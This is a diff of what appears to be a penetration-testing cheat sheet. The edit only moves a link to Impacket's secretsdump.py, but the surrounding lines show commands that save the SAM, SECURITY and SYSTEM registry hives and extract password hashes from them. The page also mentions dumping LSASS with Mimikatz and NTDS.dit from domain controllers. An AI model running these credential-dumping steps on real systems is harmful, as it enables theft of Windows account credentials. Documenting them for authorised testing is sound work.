@@ -118,11 +118,11 @@ Extracting hashes offline from LSASS using Mimikatz
 # reg.exe save HKLM\security security.save
 # reg.exe save HKLM\system system.save
 
-Download files to dump SAM hahses offline using [Secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
+Download files to dump SAM hahses offline using Secretsdump.py
 # python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
 ### NTDS.dit dump
-Secretsdump.py to dump NTDS.dit hashes remotely
+[Secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump NTDS.dit hashes remotely
 
 NTDSutil to dump NTDS.dit locally on a Domain Controller
 
